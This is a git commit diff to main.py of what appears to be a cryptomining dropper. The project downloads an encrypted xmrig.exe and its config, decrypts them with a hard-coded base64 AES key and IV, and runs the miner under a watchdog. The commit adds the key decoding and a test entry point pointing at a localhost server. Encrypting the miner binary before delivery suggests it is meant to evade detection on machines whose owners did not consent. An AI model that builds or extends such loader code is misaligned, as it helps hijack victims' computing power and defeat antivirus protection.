a0b955f6fb62543d814c02d9a2be9939e6546946
Vbrawl <greninjagr@gmail.com>
2023-06-12 01:08:23 +0300

    Slightly modified and added test code.

--- main.py
+++ main.py
@@ -2,6 +2,7 @@ from lib.Config import Config
 from lib.Downloader import Downloader
 from lib.Encryptor import Encryptor
 from lib.Miner import Miner
+import base64
 
 
 class Main:
@@ -31,7 +32,9 @@ class Main:
 
 
     def decrypt(self, binary_path, config_path):
-        encryptor = Encryptor(self.config.KEY, self.config.IV)
+        encryptor = Encryptor(
+            base64.b64decode(self.config.KEY),
+            base64.b64decode(self.config.IV))
 
         encryptor.decrypt(binary_path)
         encryptor.decrypt(config_path)
@@ -39,6 +42,23 @@ class Main:
         self.decoded = True
     
 
-    def start_mining(self, binary_path:str, poll_interval:int = 0.5):
+    def start_mining(self, binary_path:str, poll_interval:float = 0.5):
         miner = Miner(binary_path)
         miner.watchdog(poll_interval)
+
+
+if __name__ == "__main__":
+    config = {
+        "binary_name": "xmrig.exe",
+        "config_name": "config.json",
+        "server_address": "http://localhost:8080",
+        "chunk_size": 1024,
+        "KEY": "+EBvTljUQxtSi5vmj4tTmz5/oq2um0Vu4s8A5RowMQ8=",
+        "IV": "pE6FHNLt9qxk04TT/3vqQQ=="
+    }
+
+    config_obj = Config(**config)
+
+
+    Main(config_obj)
+    print("Terminated.......")
